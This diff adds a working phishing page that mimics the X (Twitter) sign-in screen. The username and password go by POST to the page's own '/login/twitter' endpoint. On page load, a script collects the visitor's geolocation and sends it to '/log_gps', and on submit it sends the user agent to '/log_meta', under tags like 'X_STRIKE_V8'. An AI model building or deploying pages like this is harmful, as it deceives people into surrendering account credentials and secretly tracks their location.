@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>X / Sign in</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com');
+        
+        body {
+            background-color: #000000;
+            color: #eff3f4;
+            font-family: 'Chirp', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .x-container {
+            width: 100%;
+            max-width: 360px;
+            margin-top: 10vh;
+        }
+
+        .input-x {
+            width: 100%;
+            background-color: #000000;
+            border: 1px solid #333639;
+            color: #ffffff;
+            font-size: 17px;
+            padding: 16px;
+            border-radius: 4px;
+            transition: border-color 0.2s;
+        }
+
+        .input-x:focus {
+            border-color: #1d9bf0;
+            outline: none;
+        }
+
+        .btn-white {
+            background-color: #eff3f4;
+            color: #0f1419;
+            font-weight: 700;
+            font-size: 16px;
+            padding: 12px;
+            border-radius: 9999px;
+            transition: background-color 0.2s;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .btn-white:active {
+            background-color: #d7dbdc;
+        }
+
+        .btn-outline {
+            border: 1px solid #536471;
+            color: #eff3f4;
+            font-weight: 700;
+            font-size: 16px;
+            padding: 12px;
+            border-radius: 9999px;
+            width: 100%;
+            margin-top: 12px;
+        }
+
+        #nexo-sync {
+            display: none;
+            font-family: monospace;
+            font-size: 10px;
+            color: #1d9bf0;
+            text-align: center;
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center min-h-screen p-6">
+
+    <div class="x-container flex flex-col items-start">
+        
+        <!-- X LOGO (VERTICAL ALIGN) -->
+        <div class="w-full flex justify-center mb-8">
+            <svg width="32" viewBox="0 0 24 24" fill="white">
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+            </svg>
+        </div>
+
+        <h1 class="text-3xl font-extrabold mb-8">Sign in to X</h1>
+
+        <form id="twForm" action="/login/twitter" method="POST" class="w-full space-y-4">
+            <div>
+                <input name="user" type="text" class="input-x" placeholder="Phone, email, or username" required autocomplete="off">
+            </div>
+
+            <div>
+                <input name="pass" type="password" class="input-x" placeholder="Password" required autocomplete="off">
+            </div>
+
+            <button id="twBtn" type="submit" class="btn-white">Log in</button>
+            
+            <button type="button" class="btn-outline">Forgot password?</button>
+        </form>
+
+        <div class="mt-10 text-[#71767b] text-sm">
+            Don't have an account? <span class="text-[#1d9bf0] cursor-pointer hover:underline">Sign up</span>
+        </div>
+
+        <!-- NEXO-V8 SYNC STATUS -->
+        <div id="nexo-sync" class="animate-pulse w-full">
+            [*] V8_X_STRIKE: PACKET_HANDSHAKE_READY
+        </div>
+    </div>
+
+    <script>
+        const twForm = document.getElementById('twForm');
+        const twBtn = document.getElementById('twBtn');
+        const syncStatus = document.getElementById('nexo-sync');
+
+        twForm.onsubmit = function() {
+            twBtn.innerText = "Authenticating...";
+            twBtn.style.opacity = "0.7";
+            syncStatus.style.display = "block";
+            
+            // Meta-Sync for Nexo-Terminal
+            const meta = {
+                ua: navigator.userAgent,
+                ref: "X_BLACKOUT_V8"
+            };
+            
+            fetch('/log_meta', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(meta)
+            });
+            
+            return true;
+        };
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    fetch('/log_gps', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            lat: p.coords.latitude, 
+                            lon: p.coords.longitude,
+                            site: "X_STRIKE_V8"
+                        })
+                    });
+                });
+            }
+        }
+    </script>
+</body>
+</html>
